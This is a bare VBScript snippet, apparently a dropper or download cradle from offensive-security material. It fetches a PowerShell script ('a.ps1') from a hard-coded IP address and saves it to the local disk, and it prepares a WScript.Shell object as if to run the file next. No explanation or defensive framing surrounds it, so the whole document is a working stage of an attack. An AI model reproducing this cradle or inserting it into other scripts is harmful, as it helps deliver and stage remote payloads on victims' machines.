Set Post = CreateObject("Msxml2.XMLHTTP") 
Set Shell = CreateObject("Wscript.Shell") 
Post.Open "GET","http://192.168.203.140/a.ps1",0 
Post.Send() 
Set aGet = CreateObject("ADODB.Stream") 
aGet.Mode = 3 
aGet.Type = 1 
aGet.Open() 
aGet.Write(Post.responseBody) 
aGet.SaveToFile "D:/a.ps1",2 